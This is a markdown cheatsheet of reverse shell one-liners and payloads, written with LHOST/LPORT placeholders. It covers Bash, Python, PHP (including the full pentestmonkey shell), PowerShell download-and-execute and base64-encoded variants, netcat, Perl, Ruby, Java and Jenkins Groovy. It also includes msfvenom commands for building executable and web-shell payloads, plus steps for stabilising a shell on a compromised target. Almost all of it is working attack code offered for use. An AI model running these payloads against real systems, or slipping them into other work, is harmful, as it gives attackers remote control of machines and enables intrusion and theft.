---
title: Reverse Shell Cheatsheet
category: reference
last_updated: 2025-12-27
description: Comprehensive collection of reverse shell one-liners and payloads
---

# Reverse Shell Cheatsheet

Replace `LHOST` with your IP and `LPORT` with your listening port.

## Listener Setup

```bash
# Netcat listener
nc -lvnp 4444

# Netcat with rlwrap (for arrow key support)
rlwrap nc -lvnp 4444

# Socat listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload <payload>; set LHOST <ip>; set LPORT <port>; run"
```

---

## Bash Reverse Shells

```bash
# Basic bash TCP
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Bash with exec
exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Bash UDP
bash -i >& /dev/udp/LHOST/LPORT 0>&1

# Bash with file descriptor
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196

# Using /bin/bash explicitly
/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
```

---

## Python Reverse Shells

### Python 3

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python 2

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python with PTY

```python
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Python Shorter Version

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

---

## PHP Reverse Shells

```php
# Basic PHP
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP with proc_open
php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP shell_exec
php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP passthru
php -r '$sock=fsockopen("LHOST",LPORT);passthru("/bin/sh -i <&3 >&3 2>&3");'

# PHP popen
php -r '$sock=fsockopen("LHOST",LPORT);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

### PHP Web Shell One-Liner

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"); ?>
```

### PHP Pentestmonkey (save as file)

```php
<?php
set_time_limit(0);
$ip = 'LHOST';
$port = LPORT;
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/sh -i';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock) || feof($pipes[1])) { break; }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a = null, $error_a = null, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

---

## PowerShell Reverse Shells

### Basic PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Base64 Encoded

```powershell
# Generate base64 payload
$Text = '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)

# Execute
powershell -e <base64_encoded_payload>
```

### PowerShell Conpty Shell (better TTY)

```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST LPORT
```

### Powercat

```powershell
# Download and execute
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c LHOST -p LPORT -e cmd.exe
```

---

## Netcat Reverse Shells

```bash
# Netcat traditional
nc -e /bin/sh LHOST LPORT
nc -e /bin/bash LHOST LPORT
nc -e cmd.exe LHOST LPORT

# Netcat without -e (mkfifo method)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f

# Netcat without -e (alternative)
rm -f /tmp/p; mknod /tmp/p p && nc LHOST LPORT 0</tmp/p | /bin/sh 1>/tmp/p

# Ncat with SSL
ncat --ssl LHOST LPORT -e /bin/bash
```

---

## Perl Reverse Shells

```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl without /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby Reverse Shells

```ruby
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby without /bin/sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java Reverse Shell

```java
// Save as shell.java, compile with javac, run with java
public class shell {
    public static void main(String[] args) {
        Runtime r = Runtime.getRuntime();
        String cmd[] = {"/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

### Java One-liner (via Runtime)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## Groovy Reverse Shell (Jenkins)

```groovy
String host="LHOST";int port=LPORT;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## msfvenom Payloads

### Linux

```bash
# Linux x64 staged
msfvenom -p linux/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf

# Linux x64 stageless
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf

# Linux x86 staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf

# Linux x86 stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf

# Linux Meterpreter x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell.elf
```

### Windows

```bash
# Windows x64 staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell.exe

# Windows x64 stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell.exe

# Windows x86 staged
msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell.exe

# Windows x86 stageless
msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell.exe

# Windows Meterpreter x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell.exe

# Windows Meterpreter x64 HTTPS
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=443 -f exe > shell.exe
```

### Web Payloads

```bash
# PHP
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > shell.war

# ASP
msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp

# ASPX
msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f aspx > shell.aspx
```

### Scripting Languages

```bash
# Python
msfvenom -p cmd/unix/reverse_python LHOST=LHOST LPORT=LPORT -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=LHOST LPORT=LPORT -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=LHOST LPORT=LPORT -f raw > shell.pl

# PowerShell
msfvenom -p cmd/windows/reverse_powershell LHOST=LHOST LPORT=LPORT -f raw > shell.ps1
```

---

## Shell Stabilization

### Python PTY

```bash
# On target
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/bash")'

# Background shell
Ctrl+Z

# On attacker machine
stty raw -echo; fg

# On target (set terminal)
export TERM=xterm
export SHELL=/bin/bash
```

### Script Method

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

### Socat Stabilization

```bash
# On attacker (listener)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
```

### Rlwrap Method

```bash
# Use rlwrap with nc for command history
rlwrap nc -lvnp 4444
```

### Fix Terminal Size

```bash
# On attacker (get terminal size)
stty size
# Example output: 50 200

# On target (set size)
stty rows 50 columns 200
```

---

## Quick Reference Table

| Language   | Complexity | TTY  | Notes                      |
|------------|------------|------|----------------------------|
| Bash       | Simple     | No   | Most reliable on Linux     |
| Python     | Medium     | Yes  | Common on Linux systems    |
| PHP        | Simple     | No   | Web server context         |
| PowerShell | Medium     | No   | Windows native             |
| Netcat     | Simple     | No   | May need mkfifo method     |
| Perl       | Medium     | No   | Often available            |
| Ruby       | Medium     | No   | Less common                |
| Java       | Complex    | No   | Jenkins/Tomcat contexts    |
